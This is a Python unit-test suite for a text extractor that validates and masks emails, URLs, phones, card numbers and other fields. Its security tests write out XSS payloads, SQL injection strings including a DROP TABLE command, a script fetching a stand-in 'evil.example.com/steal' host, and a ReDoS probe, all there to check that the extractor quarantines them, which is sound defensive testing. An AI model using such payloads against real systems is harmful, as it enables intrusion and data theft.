#!/usr/bin/env python3
"""
Test suite for the extractor.

Run with:
    python src/test_main.py          # zero dependencies, prints a summary
    python -m unittest discover src  # or through the standard test runner
"""

import unittest

from main import (
    PATTERNS,
    _luhn_ok,
    extract,
    injection_reason,
    mask_card,
    mask_email,
    validate_card,
    validate_email,
    validate_url,
)


def values(text, kind, mask=False):
    """Small helper: run the extractor and return one type's results."""
    return extract(text, mask=mask).data[kind]


def reasons(text):
    return {r["reason"] for r in extract(text).rejected}


class TestEmails(unittest.TestCase):
    def test_valid_forms(self):
        text = "a@b.io, first.last+tag@sub.domain.example.co.uk, USER_99@mail.example.org"
        found = values(text, "email_addresses")
        self.assertIn("a@b.io", found)
        self.assertIn("first.last+tag@sub.domain.example.co.uk", found)
        self.assertIn("USER_99@mail.example.org", found)

    def test_rejects_malformed(self):
        for bad in ["not-an-email@", "@nodomain.com", "user@localhost", "user@@x.com"]:
            self.assertEqual(values(bad, "email_addresses"), [], msg=bad)

    def test_rejects_consecutive_dots(self):
        self.assertFalse(validate_email("double..dots@example.com")[0])

    def test_masking_hides_local_part(self):
        self.assertEqual(mask_email("aline@example.com"), "a***e@example.com")


class TestUrls(unittest.TestCase):
    def test_valid_forms(self):
        text = ("https://a.example.com/p?q=1#f and http://host.example.net:8080/x")
        found = values(text, "urls")
        self.assertEqual(len(found), 2)

    def test_strips_trailing_sentence_punctuation(self):
        self.assertEqual(values("See https://example.com/docs.", "urls"),
                         ["https://example.com/docs"])

    def test_rejects_non_http_schemes(self):
        self.assertEqual(values("ftp://files.example.com/d.zip", "urls"), [])
        self.assertFalse(validate_url("javascript:alert(1)")[0])

    def test_rejects_embedded_credentials(self):
        self.assertFalse(validate_url("https://user:pass@example.com/")[0])


class TestPhones(unittest.TestCase):
    def test_common_formats(self):
        text = "(555) 123-4567 / 555-987-6543 / 555.246.8100 / +250 788 123 456"
        self.assertEqual(len(values(text, "phone_numbers")), 4)

    def test_ignores_non_phone_digit_runs(self):
        self.assertEqual(values("1234567890123456789 and 12-34", "phone_numbers"), [])

    def test_dedupes_across_formats(self):
        # Same number written two ways collapses to one entry.
        self.assertEqual(len(values("+250 788 123 456 and +250-788-123-456",
                                    "phone_numbers")), 1)


class TestCreditCards(unittest.TestCase):
    def test_luhn(self):
        self.assertTrue(_luhn_ok("4111111111111111"))
        self.assertFalse(_luhn_ok("1234567890123456"))

    def test_invalid_checksum_is_rejected(self):
        self.assertIn("failed_luhn_checksum", reasons("Card: 1234 5678 9012 3456"))

    def test_output_is_always_masked(self):
        found = values("4111 1111 1111 1111", "credit_card_numbers", mask=False)
        self.assertEqual(found[0]["masked"], "**** **** **** 1111")
        # The raw PAN must appear nowhere in the serialised record.
        self.assertNotIn("4111111111111111", str(found).replace(" ", ""))

    def test_brand_detection(self):
        self.assertEqual(values("3782 822463 10005", "credit_card_numbers")[0]["brand"],
                         "American Express")

    def test_mask_helper(self):
        self.assertEqual(mask_card("5500-0000-0000-0004"), "**** **** **** 0004")


class TestTimes(unittest.TestCase):
    def test_valid(self):
        found = values("09:05, 9:05 AM, 23:59:59, 12:00 PM, 7:30 a.m.", "times")
        self.assertEqual(len(found), 5)

    def test_rejects_impossible_times(self):
        self.assertEqual(values("25:99 and 19:61 and 7:60 PM", "times"), [])


class TestHtmlAndHashtags(unittest.TestCase):
    def test_tags(self):
        found = values('<div class="a"> </div> <br/>', "html_tags")
        self.assertEqual(len(found), 3)

    def test_hashtags_exclude_hex_colours_and_numbers(self):
        found = values("#regex #ffffff #12345 #_ok", "hashtags")
        self.assertEqual(found, ["#regex", "#_ok"])


class TestCurrency(unittest.TestCase):
    def test_symbol_and_code_forms(self):
        found = values("$1,299.00 EUR 25,00 150,000 RWF £2,450.75", "currency_amounts")
        self.assertEqual(len(found), 4)


class TestSecurity(unittest.TestCase):
    def test_script_tag_quarantined(self):
        self.assertIsNotNone(injection_reason("<script>alert(1)</script>"))
        self.assertEqual(values("<script>alert(1)</script>", "html_tags"), [])

    def test_event_handler_quarantined(self):
        self.assertEqual(values('<img src=x onerror="alert(1)">', "html_tags"), [])

    def test_sql_injection_quarantined(self):
        self.assertIsNotNone(injection_reason("admin' OR '1'='1' --"))
        self.assertIsNotNone(injection_reason("'; DROP TABLE users; --"))

    def test_clean_url_inside_hostile_line_is_quarantined(self):
        hostile = "<script>fetch('https://evil.example.com/steal')</script>"
        self.assertEqual(values(hostile, "urls"), [])

    def test_html_comment_is_not_mistaken_for_sql(self):
        self.assertIsNone(injection_reason("<!-- retry window 15:00 -->"))

    def test_patterns_terminate_on_adversarial_input(self):
        # A classic catastrophic-backtracking probe. Bounded quantifiers mean
        # this returns immediately instead of hanging.
        probe = "a" * 5000 + "@" + "b" * 5000
        for pattern in PATTERNS.values():
            pattern.findall(probe)      # must not hang

    def test_validate_card_rejects_short_numbers(self):
        self.assertFalse(validate_card("4111-1111-1111")[0])


if __name__ == "__main__":
    unittest.main(verbosity=2)
